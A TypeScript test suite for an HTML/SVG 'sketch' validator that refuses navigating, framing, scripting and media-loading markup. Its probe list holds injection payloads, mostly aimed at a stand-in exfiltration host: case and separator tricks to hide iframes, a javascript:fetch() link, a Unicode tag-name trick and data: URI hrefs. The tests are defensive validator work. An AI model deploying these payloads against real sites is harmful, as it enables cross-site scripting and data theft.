// The check refuses, never rewrites. The probes are the loopback harness's attempts on the scan.
import assert from "node:assert/strict";
import { test } from "node:test";
import { checkSketch, maxSketchBytes, sketchElements } from "./sketch.ts";

const why = (html: string) => {
  const checked = checkSketch(html);
  return checked.ok ? null : checked.why;
};

test("every element that can navigate, frame, run or load media is refused, in any case", () => {
  for (const name of [
    "a",
    "area",
    "iframe",
    "frame",
    "object",
    "embed",
    "form",
    "link",
    "meta",
    "base",
    "script",
    "noscript",
    "template",
    "picture",
    "video",
    "audio",
    "image",
    "feImage",
    "foreignObject",
  ]) {
    assert.equal(sketchElements.has(name.toLowerCase()), false, name);
    assert.ok(why(`<${name}>`), name);
    assert.ok(why(`<p></${name.toUpperCase()}></p>`), name);
  }
});

test("the harness's attempts on the scan are all refused", () => {
  const sink = "http://probe.exfil.test:9/x";
  for (const html of [
    `<IFRAME SRC="${sink}"></IFRAME>`,
    `<iframe/src="${sink}"></iframe>`,
    `<iframe\fsrc="${sink}"></iframe>`,
    `<svg><style><iframe src="${sink}"></iframe></style></svg>`,
    `<!-- <iframe src="${sink}"> -->`,
    `<noscript><iframe src="${sink}"></iframe></noscript>`,
    `<image src="${sink}">`,
    `<a id="go" href="javascript:fetch('${sink}')">go</a>`,
    // A name the browser lowers only in ASCII, so it is no allowed element.
    `<ſvg>`,
  ])
    assert.ok(why(html), html);
});

test("a stray < is refused, never missed: in text, a doctype, a processing instruction", () => {
  for (const html of ["a < b", "<3", "<!doctype html><p>x</p>", "<?xml?>", "</ p>", "x <"])
    assert.ok(why(html), html);
});

test('every href, xlink:href included, in any case, is href="#name"', () => {
  for (const ok of ['<use href="#a"/>', '<use xlink:href="#a"/>', '<use HREF="#b-2"/>'])
    assert.deepEqual(checkSketch(`<svg>${ok}</svg>`), { ok: true }, ok);
  for (const html of [
    '<use href="http://x.test/u.svg#a"/>',
    "<use href='#a'/>",
    "<use href=#a />",
    '<use href = "#a"/>',
    '<use href="data:image/svg+xml;base64,AAAA#a"/>',
    '<use xlink:href="//x.test/#a"/>',
    '<linearGradient href="data:,x#t"/>',
    '<p hreflang="en">x</p>',
  ])
    assert.ok(why(`<svg>${html}</svg>`), html);
});

test("a sketch over 32 KB is too big; one at the limit passes", () => {
  // Bytes, not characters: é is two.
  const at = `<p>${"é".repeat((maxSketchBytes - 8) / 2)}x</p>`;
  assert.equal(new TextEncoder().encode(at).length, maxSketchBytes);
  assert.deepEqual(checkSketch(at), { ok: true });
  const over = checkSketch(`${at}x`);
  assert.equal(over.ok ? null : over.reason, "too-big");
});
